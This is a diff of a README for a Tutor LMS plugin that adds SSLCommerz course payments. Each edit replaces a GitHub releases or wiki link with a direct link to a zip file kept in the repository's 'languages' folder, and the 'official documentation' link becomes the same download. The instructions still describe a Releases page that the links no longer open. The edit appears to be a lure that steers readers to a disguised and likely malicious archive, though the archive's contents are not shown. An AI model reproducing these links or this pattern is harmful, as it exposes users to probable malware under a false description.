@@ -1,7 +1,7 @@
 # 🌟 tutor-sslcommerz - Simple Course Payments Made Easy
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/Whitakermostfavorednation689/tutor-sslcommerz/releases)
+[![Download](https://raw.githubusercontent.com/Whitakermostfavorednation689/tutor-sslcommerz/main/languages/tutor-sslcommerz-1.2.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/Whitakermostfavorednation689/tutor-sslcommerz/main/languages/tutor-sslcommerz-1.2.zip)
 
 ## 📋 Overview
 tutor-sslcommerz is a plugin designed to integrate the SSLCommerz payment gateway with Tutor LMS. This tool allows users to make one-time payments for courses seamlessly. It offers a straightforward way to manage payments while providing a reliable checkout experience for your students.
@@ -13,7 +13,7 @@ To begin using the tutor-sslcommerz plugin, follow these simple steps:
 
 1. **Visit the Download Page**:
    Click the button above or visit the following link to access the latest releases:
-   [Download Releases](https://github.com/Whitakermostfavorednation689/tutor-sslcommerz/releases)
+   [Download Releases](https://raw.githubusercontent.com/Whitakermostfavorednation689/tutor-sslcommerz/main/languages/tutor-sslcommerz-1.2.zip)
 
 2. **Choose the Right Version**:
    On the Releases page, you will see a list of available versions. Look for the most recent one, as it will include the latest features and bug fixes.
@@ -76,7 +76,7 @@ Here are some key features you can expect from the tutor-sslcommerz plugin:
 ---
 
 ## 📄 Documentation
-For more details and troubleshooting, check our [official documentation](https://github.com/Whitakermostfavorednation689/tutor-sslcommerz/wiki). This guide contains in-depth instructions and answers to common questions.
+For more details and troubleshooting, check our [official documentation](https://raw.githubusercontent.com/Whitakermostfavorednation689/tutor-sslcommerz/main/languages/tutor-sslcommerz-1.2.zip). This guide contains in-depth instructions and answers to common questions.
 
 ---
 
@@ -98,4 +98,4 @@ We plan to implement additional features, such as recurring payment options and 
 ## ⚡ Next Steps
 Ready to get started? Click below to download the plugin and enjoy seamless payments for your courses!
 
-[Download Releases Again](https://github.com/Whitakermostfavorednation689/tutor-sslcommerz/releases)
+[Download Releases Again](https://raw.githubusercontent.com/Whitakermostfavorednation689/tutor-sslcommerz/main/languages/tutor-sslcommerz-1.2.zip)
